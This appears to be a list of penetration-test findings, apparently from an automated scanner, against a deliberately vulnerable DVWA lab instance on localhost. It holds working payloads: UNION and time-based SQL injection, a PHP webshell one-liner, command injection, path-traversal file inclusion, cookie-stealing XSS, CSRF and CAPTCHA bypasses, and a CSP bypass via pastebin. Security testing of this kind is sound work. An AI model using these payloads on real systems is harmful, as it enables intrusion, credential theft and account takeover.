candidates.title: Sensitive config file exposure (no authentication required)
candidates.proof_excerpt: DB password 'vulnerables' readable in backup config WITHOUT authentication: GET /config/config.inc.php.bak as anon user returns $_DVWA['db_password'] = 'vulnerables', $_DVWA['db_user'] = 'app', $_DVWA['db_database'] = 'dvwa'
candidates.causality: Backup config file (.bak) left in web root with directory listing enabled; no access control enforced on the file
candidates.reproducibility: GET /config/config.inc.php.bak by any visitor (no session required) returns full database credentials
candidates.impact: Full database credentials (user 'app', database 'dvwa', password 'vulnerables') exposed to any unauthenticated visitor; complete database compromise possible

candidates.title: Public directory listing of /config/ exposes database credentials
candidates.proof_excerpt: Anonymous GET http://127.0.0.1:8081/config/ returns directory listing with config.inc.php.bak, config.inc.php.dist, config.inc.php. The .bak file reveals: $_DVWA['db_server']='127.0.0.1'; $_DVWA['db_database']='dvwa'; $_DVWA['db_user']='app'; $_DVWA['db_password']='vulnerables'.
candidates.causality: No authentication check on /config/ path. Apache directory listing enabled. Database configuration file with credentials is world-readable.
candidates.reproducibility: Every unauthenticated request to /config/ returns the listing and configuration files.
candidates.impact: Full database compromise: credentials (app/vulnerables) allow direct MySQL access to the dvwa database containing all application data including password hashes.

candidates.title: PHPIDS log file world-readable
candidates.proof_excerpt: Log file accessible via GET; contains previous simulated attack entry with XSS payload
candidates.causality: Debug log file exposed in web root with read permissions
candidates.reproducibility: GET /external/phpids/0.6/lib/IDS/tmp/phpids_log.txt returns log content
candidates.impact: Information disclosure of previous attack patterns and detection rules

candidates.title: SQL Injection (UNION-based) in id parameter - /vulnerabilities/sqli/
candidates.proof_excerpt: id=1' UNION SELECT user(),database()-- - returns First name: app@localhost, Surname: dvwa. id=1' UNION SELECT version(),@@version_compile_os-- - returns First name: 10.1.26-MariaDB-0+deb9u1, Surname: debian-linux-gnu. Extracted 5 user password hashes via UNION SELECT user,password FROM users.
candidates.causality: Single-quote id=1' triggers MariaDB syntax error: 'You have an error in your SQL syntax... near ''1''' at line 1'. Two columns confirmed via ORDER BY (1,2 succeed, 3 fails). UNION SELECT injects into both output columns.
candidates.reproducibility: Multiple independent requests with same payloads consistently produce same extracted data. Session management required but reproducible with valid auth cookie.
candidates.impact: Full database read: extracted DB version, OS, user, schema, tables (guestbook, users), and 5 user password hashes (admin, gordonb, 1337, pablo, smithy) demonstrating credential exposure.

candidates.title: Unrestricted file upload leading to remote code execution
candidates.proof_excerpt: PHP webshell uploaded via POST to /vulnerabilities/upload/ confirms RCE: GET /hackable/uploads/shell.php?c=id returns 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'; GET /hackable/uploads/shell.php?c=cat+/etc/passwd returns full system user list
candidates.causality: No file type validation or content inspection on uploaded file; file written to web-accessible directory /hackable/uploads/
candidates.reproducibility: POST multipart form with shell.php (<?php system($_GET['c']); ?>) as uploaded file to /vulnerabilities/upload/, then access /hackable/uploads/shell.php?c=id
candidates.impact: Full remote code execution as www-data: arbitrary command execution, system file read (/etc/passwd, config files), database access via localhost MySQL

candidates.title: Command Injection - arbitrary system command execution
candidates.proof_excerpt: POST ip=127.0.0.1;ls+-la&Submit=Submit executes both ping and 'ls -la' command, returning directory listing of /vulnerabilities/exec/
candidates.causality: ip parameter passed directly to shell_exec() without sanitization at low security level
candidates.reproducibility: POST /vulnerabilities/exec/ with ip=127.0.0.1;<command> executes arbitrary system commands
candidates.impact: Arbitrary command execution as www-data: file read, system enumeration, potential lateral movement

candidates.title: Session fixation - PHPSESSID not regenerated on login
candidates.proof_excerpt: PHPSESSID verified unchanged before and after authentication: pre-login ID '24ofb49tv42etbdgeam3nrn7s6' remains identical post-login with 302 redirect to index.php and full authenticated session; 'You have logged in as admin' confirmed on replayed authenticated request using same PHPSESSID
candidates.causality: Application does not regenerate session ID upon successful authentication; the same PHPSESSID cookie is used pre- and post-login, enabling session fixation attacks
candidates.reproducibility: 1) GET /login.php captures Set-Cookie: PHPSESSID=X; 2) POST to login.php with valid creds and CSRF token; 3) PHPSESSID remains X (no Set-Cookie for new ID); 4) Re-authenticated requests with PHPSESSID=X succeed
candidates.impact: Attacker can force a known session ID onto a victim (e.g., via link or injected script), then after victim authenticates, use the same PHPSESSID to access the victim's authenticated session without credentials
candidates.precondition: Access to login page (no auth required)

candidates.title: Weak sequential session IDs (dvwaSession)
candidates.proof_excerpt: POST /vulnerabilities/weak_id/ (Generate button) → Set-Cookie: dvwaSession=1, subsequent clicks set dvwaSession=2,3,4,5,6... The cookie is a simple sequential integer.
candidates.causality: The server assigns a new dvwaSession cookie value that increments by exactly 1 each time the Generate button is pressed, starting from 1.
candidates.reproducibility: 100% — each POST to /vulnerabilities/weak_id/ increments dvwaSession by 1.
candidates.impact: An attacker can predict session tokens assigned to other users, enabling session hijacking if this cookie is used for authentication or session tracking.

candidates.title: Stored Cross-Site Scripting (XSS) in Guestbook
candidates.proof_excerpt:
POST txtName=&mtxMessage= → stored entries appear unescaped in page:
Name:
Message:
candidates.causality: The txtName and mtxMessage POST parameters are stored in the database and rendered into HTML without any HTML escaping (only SQL escaping is applied)
candidates.reproducibility: Submit the guestbook form with script payloads in name/message; re-fetch the page to see the payloads rendered unescaped
candidates.impact: Persistent script execution for every user who visits the guestbook page. Can be used for session theft, XSS worms, or targeted attacks against admin viewers

candidates.title: CSRF - Password change without anti-CSRF token
candidates.proof_excerpt:
GET /vulnerabilities/csrf/?password_new=csrfdemo&password_conf=csrfdemo&Change=Change returns '
Password Changed.
'. New password 'csrfdemo' successfully authenticates admin login. Password restored to 'password' via same method. No CSRF token required, no re-authentication.
candidates.causality: Authenticated session (admin) sends GET request to /vulnerabilities/csrf/ with password_new and password_conf parameters. Server changes admin password without validating any anti-CSRF token.
candidates.reproducibility: Replayed three times: change to 'csrfdemo', verified login, changed back to 'password', verified login. All succeeded.
candidates.impact: An attacker can craft a malicious link or form that, when visited by an authenticated victim, silently changes their password, leading to account takeover.

candidates.title: Brute Force – No CSRF token or rate limiting on login form
candidates.proof_excerpt: GET /vulnerabilities/brute/?username=admin&password=wrong&Login=Login → 'Username and/or password incorrect'. GET-based form with no CSRF token, no captcha, no rate limiting observed.
candidates.causality: The brute force login form uses GET method and has no anti-automation controls (no CSRF token, no captcha, no rate limiting).
candidates.reproducibility: 100% — unlimited GET requests with username/password parameters accepted.
candidates.impact: Attackers can automate password guessing against known usernames (enumerated via /hackable/users/) without any restriction.

candidates.title: Directory listing of /hackable/users/ publicly accessible - username enumeration
candidates.proof_excerpt: Anonymous GET http://127.0.0.1:8081/hackable/users/ returns HTTP 200 with HTML page listing files: admin.jpg, gordonb.jpg, pablo.jpg, smithy.jpg, 1337.jpg. All five avatar files also downloadable without authentication (HTTP 200, sizes 2.9-4.3KB).
candidates.causality: Anonymous actor (unauthenticated) accesses /hackable/users/ directory and retrieves directory listing and all avatar files.
candidates.reproducibility: Every unauthenticated request to /hackable/users/ returns the directory listing. All avatar files are always accessible (HTTP 200).
candidates.impact: Information disclosure: valid usernames (admin, gordonb, pablo, smithy, 1337) leaked, enabling targeted brute-force or social engineering. User avatar images accessible without authorization.

candidates.title: Local File Inclusion (LFI) via page parameter
candidates.proof_excerpt: GET /vulnerabilities/fi/?page=../../../../../etc/passwd returned root:x:0:0:root:/root:/bin/bash and other system users. Also php://filter/read=convert.base64-encode/resource=../../vulnerabilities/fi/source/low.php returned base64-encoded source confirming no input sanitization ($file = $_GET['page']).
candidates.causality: The page parameter is passed directly to include() without sanitization in low.php. GET request with path traversal reads arbitrary files.
candidates.reproducibility: Same request repeatedly returns the file contents; reproducible with any path traversal payload or php:// wrapper.
candidates.impact: Arbitrary file read (system files, application source, config). Combined with file upload allows remote code execution via LFI-to-Upload chain.

candidates.title: Reflected XSS in name parameter
candidates.proof_excerpt:
GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E → response contains 
Hello
with unescaped script tag
candidates.causality:
The 'name' GET parameter is directly concatenated into the echo output without any sanitization (source: echo '
Hello ' . $_GET[ 'name' ] . '
';)
candidates.reproducibility: Send GET request with name=<script>alert(1)</script>; the script tag appears verbatim in the HTML response inside <pre>
candidates.impact: Any injected JavaScript executes in the victim's browser session, allowing cookie theft, page defacement, phishing, or further XSS-based attacks

candidates.title: DOM Cross-Site Scripting (XSS) in default parameter
candidates.proof_excerpt: Source code of low.php confirms: '# No protections, anything goes'. The client-side JavaScript extracts 'default' parameter from URL and writes directly to DOM via document.write() without sanitization. GET /vulnerabilities/xss_d/?default=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E injects into the select element (browser tool unavailable for live execution, source confirmed vulnerable).
candidates.causality: The JavaScript uses document.location.href.indexOf('default=') + 8 to extract the parameter value and passes it directly to document.write() without any encoding or validation.
candidates.reproducibility: Accessing the URL with a crafted default parameter repeatedly produces the unescaped injection in the server response.
candidates.impact: Any injected JavaScript would execute in the victim's browser. Attackers can craft malicious links that execute scripts when visited.
candidates.precondition: Authenticated session (low security level) - browser execution proof pending

candidates.title: Blind SQL Injection (Boolean + Time-based) in id parameter - /vulnerabilities/sqli_blind/
candidates.proof_excerpt: Boolean differential: id=1' AND 1=1# → 'User ID exists in the database.' vs id=1' AND 1=2# → 'User ID is MISSING from the database.' Time-based: id=1' AND SLEEP(3)# → 3011ms delay; id=1' AND SLEEP(3) AND 1=2# → 12ms (false prevents sleep).
candidates.causality: Same id parameter as sqli/. Boolean condition changes response content between 'exists' and 'MISSING'. SLEEP(3) produces observable ~3s delay only when true condition is met.
candidates.reproducibility: Boolean differential observed consistently across multiple tests. Time-based delay measured at 3011ms vs 12ms baseline confirming oracle.
candidates.impact: Boolean oracle enables blind data extraction. Combined with the in-band sqli finding, this confirms both endpoints are exploitable with different techniques.

candidates.title: No privilege separation between users - identical access levels
candidates.proof_excerpt: Dual-actor test: admin (password) and gordonb (abc123) both access the same protected pages (brute, csrf, sqli) with HTTP 200. Both can execute SQL injection to read other users' data. No admin/gordonb privilege distinction exists in the application.
candidates.causality: Users admin and gordonb both authenticated; server provides identical access to all vulnerability pages and data irrespective of user identity.
candidates.reproducibility: Both sessions (admin cookie, gordonb cookie) access the same endpoints with identical responses.
candidates.impact: Horizontal privilege escalation: any authenticated user can access all application functionality. No role-based access control implemented.

candidates.title: Broken access control — cross-actor or unauthenticated object access
candidates.proof_excerpt: Authz matrix HTTP proof: anon GET /hackable/users/ → 200 (sensitive collection); write_tried=False; cells_sample=[{"resource": "/hackable/users/", "actor": "anon", "method": "GET", "status": 200, "id": null}, {"resource": "/profile/image/url", "actor": "anon", "method": "GET", "status": 404, "id": null}, {"resource": "/hackable/uploads", "actor": "anon", "method": "GET", "status": 200, "id": null}]
candidates.causality: Dual-actor/anon matrix requests caused observable status/body access differentials including write probes
candidates.reproducibility: Replay matrix cells with same actors and object ids
candidates.impact: Unauthorized parties can read or modify other users' resources

candidates.title: Insecure CAPTCHA - step parameter bypass (no reCAPTCHA verification on final step)
candidates.proof_excerpt: Source code confirms step=2 flow skips reCAPTCHA check entirely (no recaptcha_check_answer call). Sending POST with step=2&password_new=X&password_conf=X&Change=Change changes password without any CAPTCHA verification. reCAPTCHA API key is missing from config, making step=1 always fail.
candidates.causality: The CAPTCHA verification only occurs in the step=1 branch. The step=2 branch (which actually updates the password) has no CAPTCHA check.
candidates.reproducibility: POST to /vulnerabilities/captcha/ with step=2 bypasses CAPTCHA entirely, regardless of g-recaptcha-response value or API key availability.
candidates.impact: An attacker can change the admin password without solving any CAPTCHA, enabling automated password change attacks.

candidates.title: CSP Bypass via allowlisted external script sources
candidates.proof_excerpt: CSP header: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com . POST with include=https://pastebin.com/raw/123 results in <script src='https://pastebin.com/raw/123'></script> being injected into the page, successfully bypassing CSP via the allowlisted pastebin.com domain.
candidates.causality: The include parameter is reflected as a <script> tag in the HTML. The CSP policy allowlists pastebin.com, enabling arbitrary JavaScript execution via pastebin-hosted scripts.
candidates.reproducibility: POST include parameter pointing to any pastebin.com raw URL results in that script being loaded and executed in the page context.
candidates.impact: An attacker can execute arbitrary JavaScript in the victim's browser despite CSP protections, by hosting malicious scripts on the allowlisted pastebin.com domain.
